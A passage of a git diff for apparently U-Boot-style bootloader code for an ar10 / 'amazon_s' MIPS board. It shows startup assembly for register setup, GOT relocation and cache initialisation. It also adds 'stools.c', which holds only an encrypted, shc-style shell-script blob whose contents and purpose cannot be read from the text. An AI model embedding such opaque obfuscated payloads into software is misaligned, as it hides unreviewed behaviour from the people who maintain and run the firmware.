+	/* Setup MIPS 4K/5K specifics (implementation dependent fields) */
+	MFC0(   t0, C0_Config )
+	li	t1, CONFIG0_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, CONFIG0_MIPS4K5K
+	or	t0, t1
+	MTC0(	t0, C0_Config )
+
+	MFC0(   t0, C0_Status )
+	li	t1, STATUS_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, STATUS_MIPS4K5K
+	or	t0, t1
+	MTC0(	t0, C0_Status )
+
+/************************************************************************
+ *  MIPS32/MIPS64 specific cpu initialisation
+ ************************************************************************/
+mips32_64:
+
+	/* Setup generic MIPS32/MIPS64 fields of STATUS register */
+	MFC0(   t0, C0_Status )
+	li	t1, ~STATUS_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, STATUS_MIPS32_64
+	or	t0, t1
+	MTC0(	t0, C0_Status )
+
+	/* Setup generic MIPS32 fields of CONFIG0 register */
+	MFC0(   t0, C0_Config )
+	li	t1, ~CONFIG0_MIPS32_64_MSK
+	and	t0, t1
+	li	t1, CONFIG0_MIPS32_64
+	or	t0, t1
+	MTC0(	t0, C0_Config )
+
+
+	/* Initialize GOT pointer.
+	*/
+	bal     1f
+	nop
+	.word   _GLOBAL_OFFSET_TABLE_
+1:
+	move    gp, ra
+	lw      t1, 0(ra)
+	move	gp, t1
+       
+    
+   	/* Initialize any external memory.
+	 */
+	la      t9, lowlevel_init
+	jalr    t9
+	nop
+lowlevel_init_done:
+
+sys_init_cache:
+
+#define RA                      t4
+#define icache_size             t3
+#define icache_linesize         t2
+#define dcache_size             t1
+#define dcache_linesize         t0
+        move    RA, ra
+        move    a0, k1
+        bal     sys_determine_icache_linesize_flash
+        nop
+	move    icache_linesize, v0 /*icache_linesize=0x20 for amazon_s*/
+
+        bal     sys_determine_icache_lines_flash /*icache lines=0x400 for amazon_s*/
+        nop
+        multu   icache_linesize, v0
+        mflo    icache_size /*icache_size=0x8000 for amazon_s*/
+
+        bal             sys_determine_dcache_linesize_flash
+        nop
+        move    dcache_linesize, v0 /*dcache_linesize=0x20 for amazon_s*/
+
+        bal         sys_determine_dcache_lines_flash /*dcache lines=0x200 for amazon_s*/
+        nop
+        multu   dcache_linesize, v0
+        mflo    dcache_size  /*dcache_size=0x4000 for amazon_s*/
+
+        /* Initialise instruction cache */
+        move    a0, icache_size
+        move    a1, icache_linesize
+        bal             sys_init_icache
+        nop
+
+        /* Initialise data cache */
+        move    a0, dcache_size
+        move    a1, dcache_linesize
+        bal         sys_init_dcache
+        move    a2, k1
+
+#if 1
+change_got_table: 
+        bal     1f
+	      nop
+        .word   got_size
+1:
+        move    t1, ra
+	      lw      t1, 0(t1)
+	      
+        move    t0, gp
+        add     t1, t0, t1
+        addi    t0, 8 /*skip first 2 entries*/
+2:    
+        lw      t2, 0(t0)
+        subu    t2, 0x20000000
+        sw      t2, 0(t0)
+        bne     t0, t1, 2b  
+        addi    t0, t0, 4        
+
+      	subu    gp, 0x20000000
+#endif	    
+		li	t0, 0xBE1a7F00 
+	    la	sp, 0(t0)
+
+		la	t9, board_init_f
+	    j	t9
+	    nop
+
+
+	/* Exception handlers.
+	 */
+romReserved:
+	b romReserved
+
+romExcHandle:
+	b romExcHandle
+
+
+
+
+/* icache init */
+
+sys_init_icache:
+	li	 a3, MIPS_34K
+	beq	 a3, a2, 2f
+	nop
+
+1:
+	/* 20Kc/25Kf : Clear ITagLo/ITagHi */
+	/* Note: Use the default case because ITagLo==TagLo and ITagHI=TagHi */
+
+	/* default: Clear TagLo/TagHi */
+	MTC0( zero, C0_TagLo )
+	MTC0( zero, C0_TagHi )
+	b	0f
+	 nop
+
+2:
+	/* 24K/24KE/34K : Clear ITagLo */
+	MTC0_SEL_OPCODE( R_zero, R_C0_ITagLo, R_C0_SelITagLo )
+
+0:
+	/* Calc an address that will correspond to the first cache line */
+	// li	a2, KSEG0BASE
+	li 		a2, 0x9fc00000
+
+	/* Calc an address that will correspond to the last cache line  */
+	addu	a3, a2, a0
+	subu    a3, a1
+
+	/* Loop through all lines, invalidating each of them */
+1:
+	cache	ICACHE_INDEX_STORE_TAG, 0(a2)	/* clear tag */
+	bne	a2, a3, 1b
+	addu	a2, a1
+
+9:
+	jr	ra
+	nop
+
+
+/* dcache init */
+
+sys_init_dcache:
+	li	 a3, MIPS_34K
+	beq	 a3, a2, 2f
+	nop
+
+	/* default: Clear TagLo/TagHi */
+	MTC0( zero, C0_TagLo )
+	MTC0( zero, C0_TagHi )
+	b	0f
+	 nop
+
+1:
+	/* 20Kc/25Kf : Clear DTagLo and DTagHi */
+	MTC0_SEL_OPCODE( R_zero, R_C0_DTagLo, R_C0_SelDTagLo )
+	MTC0_SEL_OPCODE( R_zero, R_C0_DTagHi, R_C0_SelDTagHi )
+	b	0f
+	 nop
+2:
+	/* 24K/24KE/34K : Clear DTagLo */
+	MTC0_SEL_OPCODE( R_zero, R_C0_DTagLo, R_C0_SelDTagLo )
+
+
+/************************************************************************
+ *  invalidating all dcache lines
+ ************************************************************************/
+0:
+	/* Calc an address that will correspond to the first cache line */
+//	li	a2, KSEG0BASE
+	li	a2, 0x9fc00000
+
+	/* Calc an address that will correspond to the last cache line  */
+	addu	a3, a2, a0
+	subu    a3, a1
+
+	/* Loop through all lines, invalidating each of them */
+1:
+	cache	DCACHE_INDEX_STORE_TAG, 0(a2)	/* clear tag */
+	bne		a2, a3, 1b
+	addu	a2, a1
+#if 0
+/************************************************************************
+ *  fetch and lock all dcache lines
+ ************************************************************************/
+	/* Calc an address that will correspond to the first cache line */
+//	li	a2, KSEG0BASE
+	li	a2, 0x9fc00000
+
+	/* Calc an address that will correspond to the last cache line  */
+	addu	a3, a2, a0
+	subu    a3, a1
+
+	/* Loop through all lines, invalidating each of them */
+1:
+	cache	DCACHE_ADDR_FETCH_LOCK, 0(a2)	/* clear tag */
+        //cache   DCACHE_ADDR_HIT_WRITEBACK_INVALIDATE, 0(a2)  /* invalidate */
+	bne		a2, a3, 1b
+	addu	a2, a1
+
+9:
+
+#endif
+	jr	ra
+	 nop
+
+
+
+
+
+/* Subroutine : Determine icache line size */
+
+sys_determine_icache_linesize_flash:
+icache_linesize_mips32:
+
+	/* Read CONFIG1 register, which holds implementation data */
+	MFC0_SEL_OPCODE( R_t9, R_C0_Config1, R_C0_SelConfig1 )
+
+#define config1	t9
+
+	/* I-cache line size */
+	li	t8, M_Config1IL
+	and	t8, config1
+	//beq	t8, zero, icache_linesize_zero
+	li	t7, S_Config1IL
+	srl	t8, t7
+	li	t7, 0x2
+	sll	v0, t7, t8
+
+	jr	ra
+	nop
+
+/* Subroutine : Determine icache line */
+
+sys_determine_icache_lines_flash:
+icache_lines_mips32:
+
+	/* Read CONFIG1 register, which holds implementation data */
+	MFC0_SEL_OPCODE( R_t9, R_C0_Config1, R_C0_SelConfig1 )
+
+#define config1	t9
+
+	/* I-cache lines
+	 * Calculated as associativity * sets per way
+	 */
+	li	t8, M_Config1IA
+	and	t8, config1
+	li	t7, S_Config1IA
+	srl	t8, t7
+	addiu	t8,1				/* t8 = associativity	*/
+
+	li	t7, M_Config1IS
+	and	t7, config1
+	li	t9, S_Config1IS
+	srl	t7, t9
+	li	t9, 0x40
+	sll	t7, t9, t7			/* t7 = sets per way	*/
+
+	multu	t8, t7
+	mflo    v0
+
+	jr	ra
+	nop
+
+
+/* Subroutine : Determine dcache line size */
+
+sys_determine_dcache_linesize_flash:
+dcache_linesize_mips32:
+.globl   dcache_linesize_mips32
+.ent     dcache_linesize_mips32
+	/* Read CONFIG1 register, which holds implementation data */
+	MFC0_SEL_OPCODE( R_t9, R_C0_Config1, R_C0_SelConfig1 )
+
+#define config1	t9
+
+	/* D-cache line size */
+	li	t8, M_Config1DL
+	and	t8, config1
+	//beq	t8, zero, dcache_linesize_zero
+	li	t7, S_Config1DL
+	srl	t8, t7
+	li	t7, 0x2
+	sll	v0, t7, t8
+
+	jr	ra
+	nop
+.end    dcache_linesize_mips32
+/* Subroutine : Determine dcache line */
+
+sys_determine_dcache_lines_flash:
+dcache_lines_mips32:
+
+	/* Read CONFIG1 register, which holds implementation data */
+	MFC0_SEL_OPCODE( R_t9, R_C0_Config1, R_C0_SelConfig1 )
+
+#define config1	t9
+
+	/* D-cache lines
+	 * Calculated as associativity * sets per way
+	 */
+	li	t8, M_Config1DA
+	and	t8, config1
+	li	t7, S_Config1DA
+	srl	t8, t7
+	addiu	t8,1				/* t8 = associativity	*/
+
+	li	t7, M_Config1DS
+	and	t7, config1
+	li	t9, S_Config1DS
+	srl	t7, t9
+	li	t9, 0x40
+	sll	t7, t9, t7			/* t7 = sets per way	*/
+
+	multu	t8, t7
+	mflo    v0
+
+	jr	ra
+	nop
+
+dcache_writeback_invalidate:
+//    a0 : size
+//    a1 : dcache_line_size
+//    a2 : start addr
+.globl   dcache_writeback_invalidate
+.ent     dcache_writeback_invalidate
+
+	addu	t8, a2, a0
+	subu  t8, a1
+	/* Loop through all address */
+1:
+	cache	DCACHE_ADDR_HIT_WRITEBACK_INVALIDATE, 0(a2)	/* clear tag */
+//	bne		a2, t8, 1b
+	sub	t9, a2, t8
+	blez	t9, 1b
+	addu	a2, a1
+
+9:
+	jr	ra
+	nop
+        .end    dcache_writeback_invalidate
+
+dcache_hit_invalidate:
+//    a0 : size
+//    a1 : dcache_line_size
+//    a2 : start addr
+.globl   dcache_hit_invalidate
+.ent     dcache_hit_invalidate
+
+	addu	t8, a2, a0
+	subu  t8, a1
+	/* Loop through all address */
+1:
+	cache	DCACHE_ADDR_HIT_INVALIDATE, 0(a2)	/* clear tag */
+	bne		a2, t8, 1b
+	addu	a2, a1
+
+9:
+	jr	ra
+	nop
+        .end dcache_hit_invalidate
+
diff --git a/board/ar10/stools.c b/board/ar10/stools.c
new file mode 100644
--- /dev/null
+++ b/board/ar10/stools.c
@@ -0,0 +1,593 @@
+static  char data [] = 
+#define      rlax_z	1
+#define      rlax	((&data[0]))
+	"\375"
+#define      pswd_z	256
+#define      pswd	((&data[4]))
+	"\333\212\072\002\363\326\103\223\015\306\146\311\276\010\333\246"
+	"\203\045\131\067\340\141\132\061\066\307\015\145\136\240\374\163"
+	"\224\212\166\207\140\271\032\155\200\201\067\077\211\023\346\015"
+	"\070\077\105\030\240\237\111\327\147\127\074\305\367\071\070\213"
+	"\303\257\023\043\151\055\221\351\257\311\051\071\334\017\106\024"
+	"\116\213\055\357\053\167\307\222\316\004\127\306\075\220\122\000"
+	"\100\145\044\251\222\266\223\102\177\274\173\134\314\301\161\032"
+	"\115\236\011\170\026\321\013\344\325\143\253\022\364\375\023\064"
+	"\142\070\336\365\356\161\067\156\056\262\312\372\164\073\024\301"
+	"\332\036\072\360\357\106\325\304\251\200\327\235\175\352\322\337"
+	"\042\260\324\021\041\014\200\120\276\112\112\062\206\137\364\140"
+	"\176\056\121\155\164\046\062\036\246\011\274\043\364\216\003\027"
+	"\076\330\051\140\344\251\260\243\364\373\326\172\132\312\333\330"
+	"\371\054\106\156\123\171\214\371\202\110\035\167\327\041\216\025"
+	"\371\267\166\336\140\047\202\124\042\130\317\175\042\253\126\034"
+	"\330\234\212\053\025\027\045\230\140\103\017\067\144\236\115\136"
+	"\126\303\075\206\341\126\137\175"
+#define      tst2_z	19
+#define      tst2	((&data[267]))
+	"\371\260\220\355\106\057\102\002\307\314\317\031\224\364\315\241"
+	"\150\005\343\274\171\053\132"
+#define      chk2_z	19
+#define      chk2	((&data[289]))
+	"\130\271\064\131\354\055\050\166\050\151\341\151\266\330\107\312"
+	"\001\140\101\134\332\337"
+#define      opts_z	1
+#define      opts	((&data[310]))
+	"\265"
+#define      msg1_z	42
+#define      msg1	((&data[320]))
+	"\263\363\234\312\317\046\005\126\010\114\144\334\151\144\053\033"
+	"\175\205\002\300\222\045\263\221\114\112\165\211\144\157\372\002"
+	"\200\177\041\331\074\270\270\177\272\023\175\004\251\366\017\013"
+	"\206\123\313\134\265\205\076\100\031"
+#define      shll_z	8
+#define      shll	((&data[370]))
+	"\221\344\305\262\316\212\001\354\153\225"
+#define      tst1_z	22
+#define      tst1	((&data[378]))
+	"\010\227\207\262\034\024\131\106\122\217\264\150\037\114\052\331"
+	"\004\215\070\056\015\260\133"
+#define      date_z	1
+#define      date	((&data[401]))
+	"\300"
+#define      msg2_z	19
+#define      msg2	((&data[406]))
+	"\064\233\147\320\021\304\162\356\220\315\317\066\207\375\364\173"
+	"\301\176\004\272\076\331\350\146\066"
+#define      inlo_z	3
+#define      inlo	((&data[427]))
+	"\003\041\143"
+#define      xecc_z	15
+#define      xecc	((&data[433]))
+	"\205\006\203\376\311\236\316\313\202\112\322\266\033\260\063\253"
+	"\201\243\236"
+#define      lsto_z	1
+#define      lsto	((&data[449]))
+	"\172"
+#define      text_z	3086
+#define      text	((&data[718]))
+	"\363\226\300\367\212\113\235\162\277\322\016\046\243\165\135\232"
+	"\341\352\232\251\055\040\260\261\277\356\045\243\277\177\007\263"
+	"\025\307\252\237\023\107\022\323\032\041\372\275\226\130\130\167"
+	"\103\363\041\160\023\321\042\322\300\110\165\177\307\175\062\334"
+	"\105\334\174\131\044\217\054\076\260\047\373\106\177\123\276\302"
+	"\106\337\063\132\260\125\054\161\235\242\360\144\040\042\101\145"
+	"\377\275\277\043\115\353\141\375\022\134\104\222\260\002\124\367"
+	"\341\207\121\222\334\176\003\172\041\364\336\101\027\040\247\026"
+	"\335\146\071\053\122\233\050\145\370\154\367\250\156\113\237\120"
+	"\322\361\343\257\157\347\051\221\333\010\322\362\050\171\010\006"
+	"\337\102\061\061\335\131\226\325\306\216\176\065\331\036\206\254"
+	"\017\151\133\177\120\204\020\054\215\342\037\265\134\047\274\074"
+	"\152\355\156\107\107\005\035\016\223\233\103\154\271\312\030\310"
+	"\063\164\110\204\370\131\260\205\074\317\073\230\367\367\324\142"
+	"\345\102\251\055\110\307\073\333\142\177\110\033\111\140\344\175"
+	"\324\055\001\315\206\262\123\302\202\217\133\172\207\057\334\154"
+	"\162\206\232\272\115\325\226\257\125\336\313\237\236\123\147\161"
+	"\246\317\337\061\267\132\251\255\105\353\355\035\073\006\134\067"
+	"\041\360\176\111\017\145\201\364\236\201\250\032\266\237\075\010"
+	"\064\007\016\276\370\020\305\033\114\363\055\303\270\043\206\244"
+	"\210\076\217\333\021\016\236\177\233\001\335\377\313\061\263\272"
+	"\233\311\325\254\350\072\123\232\357\177\307\120\025\250\304\112"
+	"\105\135\037\377\131\005\025\247\023\364\113\005\170\114\026\172"
+	"\015\355\341\216\312\224\156\345\215\276\275\100\044\065\067\010"
+	"\036\326\333\103\250\055\366\123\157\345\334\245\301\010\265\361"
+	"\270\312\206\000\031\061\237\347\237\327\345\104\357\056\327\125"
+	"\315\017\333\124\140\111\235\247\270\371\362\247\107\112\266\145"
+	"\304\304\271\064\011\103\110\343\112\327\040\125\066\316\306\261"
+	"\034\367\163\326\257\303\365\070\322\033\134\043\262\022\052\046"
+	"\341\333\227\014\230\174\143\336\250\101\215\217\213\351\317\026"
+	"\234\164\247\237\175\012\104\316\025\175\176\112\050\127\360\157"
+	"\010\012\226\231\250\125\110\205\201\376\245\353\034\352\355\150"
+	"\137\302\060\224\145\173\075\206\300\024\226\236\325\141\155\173"
+	"\136\265\253\245\016\120\173\346\222\233\106\062\157\277\143\271"
+	"\063\234\276\325\357\012\060\334\303\034\177\251\323\110\031\230"
+	"\244\327\077\242\023\354\111\011\304\172\261\275\127\222\310\057"
+	"\017\267\022\000\247\225\304\074\341\372\250\263\270\276\272\051"
+	"\234\363\215\210\006\336\331\102\266\126\166\167\103\321\347\257"
+	"\070\262\232\155\357\055\314\352\311\103\155\116\007\303\122\026"
+	"\056\042\137\053\247\071\132\111\322\213\056\124\362\107\277\323"
+	"\215\367\002\217\133\347\056\202\067\362\352\073\102\260\004\052"
+	"\274\125\064\233\020\242\313\151\123\052\314\327\174\144\132\277"
+	"\272\072\133\212\254\261\007\200\324\056\330\342\165\045\364\210"
+	"\226\145\232\057\347\113\350\210\363\231\134\315\013\164\115\347"
+	"\137\362\331\071\064\204\311\032\221\047\003\232\136\225\003\021"
+	"\307\110\002\277\377\050\041\113\257\351\357\044\207\055\135\321"
+	"\073\302\102\151\111\002\211\164\230\152\202\125\140\156\216\141"
+	"\345\270\371\010\213\071\167\372\116\240\343\331\212\246\333\002"
+	"\113\016\066\015\064\126\324\254\340\110\144\304\204\352\327\270"
+	"\323\113\220\113\300\075\303\147\232\263\131\311\162\370\013\166"
+	"\044\173\252\233\225\013\116\155\161\165\247\303\050\152\267\025"
+	"\103\305\007\204\054\376\336\115\335\015\300\377\153\346\067\273"
+	"\357\277\137\226\174\262\100\272\114\004\106\020\066\214\151\105"
+	"\204\220\362\372\164\261\360\160\262\301\356\064\220\343\161\012"
+	"\012\100\264\163\315\325\234\272\225\100\022\257\107\141\166\233"
+	"\043\300\130\215\372\351\045\353\206\273\254\207\032\230\347\010"
+	"\271\147\221\364\335\117\216\220\337\336\122\127\141\110\035\267"
+	"\373\222\064\030\150\274\216\360\304\114\153\201\377\225\364\057"
+	"\103\176\053\241\157\223\253\261\341\351\007\243\321\006\127\215"
+	"\243\077\140\333\076\167\206\202\255\061\054\127\003\215\245\241"
+	"\362\005\173\120\154\263\376\012\073\352\254\345\315\343\135\343"
+	"\310\311\272\221\106\056\131\343\133\361\360\131\270\174\055\113"
+	"\305\343\153\264\364\116\015\072\262\043\213\276\046\032\140\147"
+	"\367\362\107\225\070\321\255\350\210\204\265\234\172\054\361\216"
+	"\041\362\141\034\226\222\173\244\377\116\271\273\262\267\212\153"
+	"\316\107\142\376\137\370\057\033\216\000\052\050\103\103\171\135"
+	"\134\346\026\313\223\311\277\355\375\142\057\174\121\056\322\154"
+	"\002\130\251\164\214\356\134\224\104\224\257\231\325\124\260\045"
+	"\013\225\355\116\070\117\224\276\177\212\264\266\323\155\213\010"
+	"\047\270\140\054\041\223\031\276\103\140\260\323\223\176\030\210"
+	"\141\051\133\244\256\135\006\150\246\140\222\310\265\137\346\066"
+	"\277\070\322\000\263\325\004\262\346\247\265\303\112\154\300\236"
+	"\027\110\374\310\123\327\214\340\117\254\367\135\240\171\353\101"
+	"\233\256\240\304\013\334\151\202\205\303\245\027\123\244\215\044"
+	"\250\142\044\057\146\172\275\204\300\240\245\264\323\015\174\222"
+	"\333\344\224\100\304\153\253\010\370\272\377\110\047\012\241\255"
+	"\342\265\342\155\247\314\061\334\206\374\213\326\113\277\030\053"
+	"\165\160\213\120\011\224\223\106\205\112\225\103\167\222\262\262"
+	"\135\062\235\206\017\314\363\012\310\222\302\107\247\267\371\342"
+	"\247\352\040\233\341\172\050\056\131\051\267\304\040\031\250\224"
+	"\340\263\335\224\256\145\316\113\126\102\147\375\002\263\311\050"
+	"\252\027\142\350\305\066\021\313\260\212\246\145\067\237\035\240"
+	"\220\130\074\330\166\267\233\172\135\346\175\341\024\167\203\360"
+	"\170\031\242\011\102\340\252\075\104\151\132\101\245\236\263\345"
+	"\270\132\237\300\225\210\322\102\025\024\015\230\245\126\253\225"
+	"\226\225\022\240\315\176\031\330\307\243\303\153\313\157\106\076"
+	"\122\320\002\113\064\345\116\021\366\052\124\262\173\100\155\021"
+	"\332\322\053\300\003\275\264\121\011\341\370\223\375\245\273\046"
+	"\245\376\125\255\031\061\336\051\061\022\063\325\203\011\062\004"
+	"\113\314\115\322\050\021\137\303\173\217\125\072\246\360\076\115"
+	"\073\325\001\104\263\204\104\017\337\101\063\036\164\344\263\212"
+	"\327\016\334\313\036\173\301\064\160\331\053\175\026\076\005\337"
+	"\263\301\240\264\342\263\073\113\053\244\125\174\112\025\131\175"
+	"\052\337\305\104\112\067\370\163\252\213\074\375\205\017\071\152"
+	"\300\057\215\316\037\325\265\116\115\124\303\234\310\203\326\206"
+	"\310\021\040\056\104\127\226\337\036\143\152\375\341\225\212\063"
+	"\262\027\150\036\325\146\036\031\123\126\220\240\017\212\172\153"
+	"\002\143\230\303\155\017\315\163\354\236\114\045\112\330\263\301"
+	"\236\356\145\160\055\353\064\212\307\200\206\156\373\022\106\162"
+	"\165\123\244\237\140\340\037\041\347\322\271\126\353\237\371\261"
+	"\175\370\122\172\031\267\105\301\165\165\100\176\161\176\244\323"
+	"\105\052\332\307\314\252\025\334\104\144\272\257\263\233\046\346"
+	"\352\320\000\000\011\253\246\032\226\261\202\340\116\330\352\262"
+	"\325\047\003\316\231\357\303\241\164\276\033\345\217\006\272\050"
+	"\070\021\011\101\314\131\104\335\346\024\314\176\365\363\206\043"
+	"\217\362\042\071\034\264\266\075\054\016\015\360\142\342\026\157"
+	"\272\363\177\265\341\335\031\365\371\242\207\345\170\256\342\156"
+	"\002\013\161\077\212\255\007\327\272\231\241\203\246\377\004\252"
+	"\274\167\137\201\355\052\235\044\135\164\316\142\013\046\020\364"
+	"\302\070\077\006\115\022\207\336\306\225\336\070\217\250\017\026"
+	"\243\255\266\025\155\307\245\326\263\377\026\015\354\211\311\136"
+	"\237\342\122\004\311\120\300\345\321\265\151\267\037\117\135\320"
+	"\320\246\002\253\105\252\313\247\042\376\364\375\047\155\247\122"
+	"\255\267\010\316\170\171\216\337\334\071\014\067\333\170\144\301"
+	"\354\103\001\377\103\314\136\240\140\360\064\227\210\120\203\347"
+	"\047\017\054\236\253\263\370\122\357\316\062\247\362\126\172\366"
+	"\373\043\020\232\344\231\012\152\271\313\235\122\107\143\141\204"
+	"\314\151\361\316\201\007\301\116\037\141\310\103\215\164\030\316"
+	"\056\155\012\015\246\301\202\265\365\351\073\234\256\334\315\316"
+	"\076\247\061\202\247\301\147\232\221\025\262\362\247\332\277\323"
+	"\215\206\036\123\274\266\275\204\160\245\337\145\315\157\366\277"
+	"\346\034\224\062\201\016\367\020\207\067\041\107\343\276\321\210"
+	"\327\152\004\116\261\100\114\203\313\221\057\372\351\316\046\220"
+	"\010\374\146\130\234\004\300\344\137\007\210\322\357\236\365\245"
+	"\240\145\011\102\355\047\055\075\146\340\351\042\267\343\334\306"
+	"\163\003\071\246\311\312\360\307\243\016\370\324\062\055\362\325"
+	"\340\365\061\123\201\364\126\145\111\341\114\126\320\230\266\115"
+	"\100\343\254\065\126\110\360\051\270\052\103\131\153\066\024\323"
+	"\210\017\141\161\112\103\217\323\324\075\334\074\156\151\060\352"
+	"\142\261\300\077\335\126\360\036\107\362\143\372\132\073\217\065"
+	"\045\216\006\065\274\124\202\263\227\070\100\111\161\034\234\242"
+	"\175\361\305\331\145\345\344\275\064\136\215\114\301\047\074\230"
+	"\076\202\246\105\170\107\247\167\217\220\350\045\315\313\152\077"
+	"\276\173\223\330\154\106\023\373\040\236\232\015\204\004\173\354"
+	"\245\063\223\253\151\107\206\203\333\277\355\275\363\326\172\206"
+	"\016\003\214\303\363\360\320\115\271\136\056\332\225\317\302\214"
+	"\325\163\046\027\060\165\377\363\373\166\204\154\032\013\062\361"
+	"\203\206\325\237\324\227\240\267\225\056\023\217\274\325\037\016"
+	"\244\141\020\121\072\111\002\011\337\200\044\015\064\366\240\344"
+	"\346\322\057\105\323\250\052\375\001\235\005\120\231\070\303\122"
+	"\263\250\233\070\215\300\016\065\317\337\045\102\204\242\345\371"
+	"\376\217\246\360\206\172\237\271\346\264\224\334\177\135\051\205"
+	"\306\032\243\335\301\167\006\323\361\044\000\160\264\120\067\305"
+	"\373\075\000\333\167\160\302\162\322\161\107\114\014\132\042\160"
+	"\323\232\104\313\066\276\333\061\157\161\162\260\023\330\242\055"
+	"\070\053\043\326\174\131\034\022\011\141\007\133\044\126\165\233"
+	"\264\075\300\162\035\135\117\226\376\310\212\102\056\015\311\276"
+	"\236\041\024\271\113\156\367\357\046\170\104\023\340\154\175\126"
+	"\010\244\325\371\010\302\167\173\241\077\310\320\270\176\255\345"
+	"\016\337\137\353\052\101\220\202\130\332\364\000\262\136\244\301"
+	"\340\050\011\023\044\162\240\015\147\073\010\323\161\343\023\313"
+	"\060\344\107\313\112\021\013\154\347\206\231\361\030\061\070\344"
+	"\101\113\342\020\345\322\207\372\136\364\045\234\275\221\204\163"
+	"\036\360\331\235\341\132\007\365\035\321\113\011\256\313\112\354"
+	"\104\012\237\356\352\373\102\026\240\142\020\227\257\243\310\172"
+	"\073\122\206\113\154\017\171\065\263\060\241\300\272\340\242\343"
+	"\121\035\206\244\154\263\263\266\006\204\115\134\125\224\375\371"
+	"\350\143\011\370\316\244\165\227\156\176\004\322\032\153\332\213"
+	"\240\041\104\031\071\146\256\303\056\003\177\147\163\044\167\271"
+	"\335\336\365\031\233\264\353\220\024\350\275\224\155\027\177\314"
+	"\027\237\231\160\065\274\014\324\031\037\113\067\027\217\053\235"
+	"\271\234\234\337\267\331\217\220\140\150\044\145\132\106\377\125"
+	"\167\214\256\226\207\203\324\220\101\165\152\353\272\231\320\254"
+	"\236\305\022\360\201\364\317\326\364\247\200\341\270\265\133\345"
+	"\212\215\045\133\032\111\254\113\346\301\231\370\040\340\246\053"
+	"\160\324\234\072\054\313\067\361\141\031\033\051\216\220\045\206"
+	"\177\025\026\262\270\204\265\304\101\023\003\153\037\065\161\342"
+	"\110\313\377\265\344\125\065\333\247\330\053\062\341\326\234\134"
+	"\121\341\111\167\242\327\126\050\151\170\356\023\375\035\137\077"
+	"\316\261\336\004\357\321\277\032\356\303\224\266\173\151\126\042"
+	"\042\062\155\311\012\165\115\263\166\066\011\326\043\330\335\014"
+	"\263\105\062\033\056\145\163\166\371\332\175\265\165\062\226\015"
+	"\071\337\247\155\301\131\320\172\147\247\065\342\341\176\053\326"
+	"\357\233\264\237\062\160\262\015\264\054\312\060\157\216\203\257"
+	"\364\035\000\357\225\037\053\232\317\063\007\230\171\200\020\107"
+	"\165\115\354\133\365\112\010\261\263\034\321\026\173\216\035\240"
+	"\324\122\140\115\246\035\110\310\273\357\271\122\114\034\235\174"
+	"\126\052\210\322\213\341\212\047\164\026\150\355\026\104\165\106"
+	"\173\003\042\123\061\124\220\273\016\212\176\035\061\070\173\142"
+	"\225\024\251\162\272\072\303\127\145\112\022\242\250\335\363\215"
+	"\152\041\142\044\315\277\072\342\222\325\322\051\310\001\136\012"
+	"\163\326\335\162\336\375\336\041\306\321\364\337\215\174\134\202"
+	"\043\061\231\221\376\003\362\347\016\220\310\000\107\106\200\200"
+	"\231\033\017\257\205\312\020\063\170\235\203\230\143\017\250\011"
+	"\053\013\272\344\345\260\316\074\345\060\162\272\375\170\264\160"
+	"\200\050\136\320\143\051\027\275\144\175\261\165\071\327\375\224"
+	"\375\017\040\035\271\144\317\217\366\213\302\227\100\226\272\077"
+	"\370\317\001\154\147\312\021\121\005\156\106\207\322\162\056\103"
+	"\305\155\256\316\233\061\021\035\350\315\306\261\057\073\216\323"
+	"\155\372\370\171\362\140\315\034\206\053\275\154\276\175\273\071"
+	"\015\042\350\322\167\155\007\254\147\341\370\270\146\327\316\163"
+	"\253\134\234\377\377\366\077\031\053\157\267\001\126\104\225\367"
+	"\046\217\210\255\260\230\377\066\131\230\227\264\022\342\176\047"
+	"\177\341\276\055\166\253\265\222\263\242\375\257\106\141\120\015"
+	"\124\034\277\037\316\306\247\252\366\317\146\131\335\035\124\212"
+	"\376\307\051\363\025\054\335\273\260\216\067\335\263\207\223\100"
+	"\224\017\215\074\266\276\201\022\335\303\314\061\203\261\177\137"
+	"\345\346\374\253\040\027\152\204\121\343\134\136\041\037\314\152"
+	"\020\315\174\157\310\065\040\271\163\210\010\366\043\313\037\100"
+	"\231\354\077\262\155\322\235\350\343\336\155\032\317\161\101\173"
+	"\220\320\345\057\373\361\132\234\272\277\040\075\370\170\153\252"
+	"\376\333\371\237\340\133\321\004\106\133\021\023\002\036\117\361"
+	"\254\340\046\315\166\112\041\147\130\235\236\337\150\117\270\265"
+	"\332\037\256\312\330\052\141\322\235\132\322\367\074\274\026\363"
+	"\074\143\166\053\004\200\045\140\233\054\161\310\262\133\301\315"
+	"\303\327\271\174\237\257\351\347\075\371\337\377\224\331\357\030"
+	"\336\344\352\170\372\255\070\005\307\000\156\212\142\235\361\276"
+	"\157\122\042\116\116\006\307\041\203\231\314\201\332\170\062\264"
+	"\320\005\201\154\135\256\111\136\310\141\303\272\243\032\032\101"
+	"\372\145\242\036\215\074\061\350\361\313\077\260\034\024\335\036"
+	"\341\143\320\065\046\123\304\201\315\113\261\252\270\044\060\122"
+	"\336\175\050\165\055\175\123\370\034\222\250\071\246\206\127\210"
+	"\352\050\275\020\173\202\222\111\315\103\364\205\147\044\330\106"
+	"\242\000\273\317\175\017\310\232\242\161\323\110\370\052\321\342"
+	"\122\217\363\316\021\205\030\337\310\014\145\060\060\075\166\323"
+	"\075\062\243\272\101\153\124\343\335\047\054\325\122\375\267\244"
+	"\215\253\163\236\060\213\175\370\230\342\050\310\037\237\234\134"
+	"\321\077\027\022\253\154\366\210\224\042\135\346\040\025\213\255"
+	"\300\377\114\361\212\311\351\042\254\022\353\313\262\210\050\203"
+	"\307\100\226\162\254\214\373\101\257\131\047\320\156\263\176\057"
+	"\262\312\040\075\223\012\140\100\035\114\013\317\324\064\123\233"
+	"\165\351\016\041\166\011\142\046\142\212\366\321\076\164\001\360"
+	"\076\042\055\322\054\216\022\112\332\036\032\256\123\155\111\310"
+	"\127\130\352\316\141\115\364\304\330\353\226\026\140\227\007\236"
+	"\272\064\161\346\302\204\061\235\243\114\113\367\271\225\300\021"
+	"\355\252\340\117\370\324\024\320\277\252\347\037\102\356\276\374"
+	"\043\060\343\346\265\025\203\130\141\316\120\033\143\020\055\121"
+	"\272\015\241\263\341\265\204\241\140\153\301\242\131\200\237\175"
+	"\261\202\143\146\230\346\277\371\265"
+#define      chk1_z	22
+#define      chk1	((&data[4107]))
+	"\056\144\235\251\246\254\016\325\165\173\267\201\016\037\327\055"
+	"\255\157\031\121\065\112"/* End of data[] */;
